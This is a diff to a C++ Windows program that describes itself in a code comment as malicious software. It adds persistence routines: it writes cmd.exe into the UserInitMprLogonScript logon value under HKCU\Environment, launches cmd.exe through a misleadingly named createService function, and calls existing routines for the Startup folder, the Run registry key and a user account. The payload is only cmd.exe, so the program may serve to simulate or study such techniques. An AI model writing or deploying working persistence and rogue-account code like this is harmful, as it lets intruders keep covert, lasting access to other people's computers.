@@ -51,7 +51,7 @@ int createRunKey() {
 
     if (res == ERROR_SUCCESS) {
         SetConsoleTextAttribute(hConsole, 2);
-        std::cout << "Successfully opened key, writing now..." << std::endl;
+        std::cout << "Successfully opened Run key, writing now..." << std::endl;
         SetConsoleTextAttribute(hConsole, 15);
 
         LONG res2 = RegSetValueExA(
@@ -64,7 +64,7 @@ int createRunKey() {
         );
         if (res2 == ERROR_SUCCESS) {
             SetConsoleTextAttribute(hConsole, 2);
-            std::cout << "Successfully wrote key, closing key now..." << std::endl;
+            std::cout << "Successfully wrote Run key, closing key now..." << std::endl;
             SetConsoleTextAttribute(hConsole, 15);
         } else {
             SetConsoleTextAttribute(hConsole, 4);
@@ -161,13 +161,13 @@ int createUser() {
             SetConsoleTextAttribute(hConsole, 15);
         } else {
             SetConsoleTextAttribute(hConsole, 4);
-            std::cout << "Failed with code: " << res3 << std::endl;;
+            std::cout << "Failed with code: " << res3 << std::endl;
             SetConsoleTextAttribute(hConsole, 15);
         }
 
     } else {
         SetConsoleTextAttribute(hConsole, 4);
-        std::cout << "Failed with code: " << dwError << std::endl;;
+        std::cout << "Failed with code: " << dwError << std::endl;
         SetConsoleTextAttribute(hConsole, 15);
     }
     return 0;
@@ -175,10 +175,94 @@ int createUser() {
 
 
 
+int createService() {
+    /*
+    STARTUPINFO info;
+    PROCESS_INFORMATION processInfo;
+
+    ZeroMemory( &info, sizeof(info) );
+    info.cb = sizeof(info);
+    ZeroMemory( &processInfo, sizeof(processInfo) );
+
+    LONG res = CreateProcess(
+        (LPCSTR)"C:\\Windows\\System32\\cmd.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        0,
+        NULL,
+        NULL,
+        &info,
+        &processInfo
+    );
+
+    if (res == 0) {
+        std::cout << "Error: " << GetLastError() << std::endl;
+    }
+
+    */
+
+    // This is a malicious software, we don't care about security
+    system("start cmd.exe");
+
+    return 0;
+}
+
+
+
+int createHKCUEnvironment() {
+    HKEY hKey = NULL;
+    const char* exe = "C:\\Windows\\System32\\cmd.exe";
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+
+    LONG res = RegOpenKeyExA(
+        HKEY_CURRENT_USER,
+        (LPCSTR)"Environment",
+        0,
+        KEY_ALL_ACCESS,
+        &hKey
+    );
+
+    if (res == ERROR_SUCCESS) {
+        SetConsoleTextAttribute(hConsole, 2);
+        std::cout << "Successfully opened UserInitMprLogonScript key, writing now..." << std::endl;
+        SetConsoleTextAttribute(hConsole, 15);
+
+        LONG res2 = RegSetValueExA(
+            hKey,
+            (LPCSTR)"UserInitMprLogonScript",
+            0,
+            REG_EXPAND_SZ,
+            (unsigned char*)exe,
+            strlen(exe)
+        );
+        if (res2 == ERROR_SUCCESS) {
+            SetConsoleTextAttribute(hConsole, 2);
+            std::cout << "Successfully wrote UserInitMprLogonScript key, closing key now..." << std::endl;
+            SetConsoleTextAttribute(hConsole, 15);
+        } else {
+            SetConsoleTextAttribute(hConsole, 4);
+            std::cout << "Failed with code: " << res << std::endl;;
+            SetConsoleTextAttribute(hConsole, 15);
+        }
+        RegCloseKey(hKey);
+    } else {
+        SetConsoleTextAttribute(hConsole, 4); 
+        std::cout << "Failed with code: " << res << std::endl;;
+        SetConsoleTextAttribute(hConsole, 15);
+    }
+
+    return 0;
+}
+
 int main() {
     startupFolder();
     createRunKey();
     createUser();
+    createService();
+    createHKCUEnvironment();
+
     return 0;
 }
 
